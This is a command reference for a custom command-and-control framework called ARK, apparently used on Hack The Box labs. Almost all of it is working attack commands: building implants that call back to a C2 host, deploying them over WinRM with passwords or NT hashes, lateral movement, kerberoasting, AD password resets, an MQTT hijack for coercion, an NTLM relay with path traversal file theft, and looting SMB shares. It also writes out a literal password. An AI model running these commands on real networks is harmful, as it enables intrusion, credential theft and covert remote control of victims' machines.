# ARK HTB — command reference

## Build

```bash
cd "/home/zero/Downloads/Zypheron project/ARK"
make proto ark
# Prefer generate (registers HMAC). Empty language is c.
# Fresh HTTPS default is 1750; use 8443 if ~/.ark/server.yaml says so.
./build/ark op generate --os windows --language c \
  --callback https://<C2>:1750 --out implant.exe
# Linux: --os linux. Bare make implant-c* does not register the secret.
# Firewalled Linux HTB: ark inbound drop user@TARGET (not make implant-c-linux)
# Go Linux is archived.
./scripts/c_linux_e2e_smoke.sh   # host unit tests + Linux C build
bash scripts/smoke_test.sh
```

## Serve / operator

**Inbound preflight** (firewall, reverse tunnel, auth drop reasons): `docs/OPERATOR_INBOUND.md`

```bash
./build/ark teamserver    # keep C2 up. `serve` REPL/stdin EOF does NOT stop C2.
# other terminal
./build/ark operator   # or unified CLI

# Dual-seat certs (operator + approver) for lab auto-approve
./build/ark certs seats

# One-shot operator (auto-approves with approver cert)
./build/ark op sessions
./build/ark op shell -- whoami
./build/ark op generate --os windows --language c --callback https://10.10.14.x:1750 --out implant.exe
./build/ark op lateral winrm 10.10.10.10 "whoami" --user u --domain DOM --hash <NT>
./build/ark op pending
./build/ark op approve-all

# Host-side (no implant)
./build/ark inbound status
./build/ark ldap enum --dc DC --domain DOM --user u --pass-file p --type interesting
./build/ark ldap dangling --dc DC --domain DOM --user u --pass-file p
./build/ark adcs dangling --dc DC --domain DOM --user u --pass-file p
./build/ark rbcd show --dc DC --domain DOM --user u --pass-file p --to HOST$
./build/ark smb shares --host DC --anon
./build/ark ad password --dc DC --domain DOM --user u --pass-file p --target t --new-pass-file n
```

If implant gets HTTP 404 on register/beacon: check teamserver log for
`reason=unknown_implant|hmac|skew|replay|parse|io|internal` (wire stays 404 on purpose).

## Deploy Windows implant via WinRM

```bash
# password in file (never bash $$ secrets)
python3 scripts/deploy_winrm.py --host <IP> --user Administrator \
  --pass-file /path/pass.txt --implant build/implant.exe

# NT hash (32 hex or LM:NT)
python3 scripts/deploy_winrm.py --host <IP> --user 'msa_health$' --domain LOGGING \
  --hash-file /path/nt.txt --implant build/implant.exe
```

## Soft path (post-session)

```text
sessions
use <session-id>
shell whoami
ifconfig
smb list_shares --host <IP> --anon
smb list_dir --host <IP> --share <name> --anon
smb download --host <IP> --share <name> --path <file> --user u --pass p
ldap-enum interesting --domain DOM --dc DC --user u --pass p
ldap-enum kerberoastable --domain DOM --dc DC --hash <NT>
lateral winrm <host> "whoami /all" --user u --pass p --domain DOM
lateral winrm <host> "whoami" --user u --hash <NT> --domain DOM
pending
approve <id>
loot
```

## Pre-implant (no teamserver) — Ghostlink-class

Full notes: `docs/OPERATOR_PRE_IMPLANT.md`

```bash
# MQTT
./build/ark mqtt sub --host <IP> --topic '#' --seconds 20
./build/ark mqtt healthcheck-hijack --host <IP> \
  --topic GhostProtocolZero/systems/node/secureshare/healthcheck \
  --url http://10.10.14.x:8888

# HTTP NTLM relay (port >= 1024; open firewalld if needed)
./build/ark relay http start \
  --listen 10.10.14.x:8888 \
  --target http://app.lab.htb/ \
  --kernel-auth
# other terminal after coerce SUCCEED:
./build/ark relay http sessions
./build/ark relay http get --session 1 --double-encode \
  --path '..\..\..\windows\win.ini' --out loot/win.ini
```

Also: operator REPL `mqtt` / `relay` (same helpers).

## Secrets without bash $$ expansion

```bash
python3 -c 'open("svc_pass.txt","w").write(r"Em3rg3ncyPa$$2026")'
```

## Paths

| Item | Path |
| --- | --- |
| DB | `~/.ark/ark.db` |
| Config | `~/.ark/server.yaml` |
| Certs | `~/.ark/certs/` |
| Eng workdir | `~/htb-<machine>/` |
| Reports | `reports/htb-<machine>/` |
| Runbook | `docs/HTB_NEXT_RUNBOOK.md` |
| Inbound / auth logs | `docs/OPERATOR_INBOUND.md` |
| AD cookbook | `docs/AD_ENGAGEMENT.md` |
| Sprint B plan | `docs/plans/SPRINT_B_AD.md` |
| Sprint 1 C lateral | `docs/plans/SPRINT_1_C_LATERAL.md` |
| Sprint L C Linux | `docs/plans/SPRINT_L_C_LINUX.md` |
| C Linux sign-off | `reports/htb-c-linux-peer/SIGN_OFF.md` |
